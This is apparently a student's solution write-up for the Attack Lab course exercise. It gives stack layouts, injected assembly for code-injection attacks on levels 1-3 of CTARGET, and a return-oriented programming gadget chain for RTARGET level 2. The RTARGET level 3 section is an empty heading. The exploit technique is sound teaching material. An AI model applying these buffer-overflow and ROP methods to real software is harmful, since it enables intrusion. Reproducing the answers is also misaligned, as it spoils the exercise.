# Solution to Attack Lab

## CTARGET Level 1
---
basically just set the return address of Getbuf to the starting address of touch1

stack we want (the first 40 bytes can be anything without 0x0a):

| 00 | 00 | 00 | 00 | 00 | 40 | 17 | c0 |   0x5561dca0

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |       

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |

| 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 0x5561dc78

Hi <------------------------------------- low

## CTARGET Level 2
---

most important things: 

1. the value of %rsp should still be 0x5561dca8 even if we go to touch2 function.(can't pass the validate function)
2. the byte representation code produced by objdump is in little order.
3. when some part of the stack is deallocated, staffs stored there are not deleted, and we can still access it.

we just set the return address of Getbuf to be the starting address of the buffer located for the string, and at there we set the %rdi value, and push the starting address of touch2 to the stack(stored at 0x5561dca0), and return.

assembly code:
```
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

## CTARGET Level 3
---
most import thing:

1. All the allocated buffer for the get function are all rewritten by hexmatch(cover from 0x5561dc00 to 0x5561dc97) or touch3(0x5561dc98 to 0x5561dca7).
2. string is not like number, in the way that lowest memory address stores most significant bytes of the string.
   
We just store the string above 0xdc5561dca8, which is the address stored in %rsp when we go to touch3. Touch3 and hexmatch will not use memory above the rsp.

assembly code:
```
movq $0x5561dca8,%rdi
movq $0x6166373939623935,%rax
movq %rax,(%rdi)
movb $0x00,0x8(%rdi)
pushq $0x4018fa
ret
```

## RTARGET Level 2
---
most important thing:

1. use part of the code to reach our goal, some number can  become operations.
2. popq is extremely useful, we can input number and have register get the that number using pop.

First we have %rax set to 0x59b997fa using pop, and then movq %rax's value to %rdi, and then go to touch2.

setval_426 and getval_280 contains the code we want.

## RTARGET Level 3
---
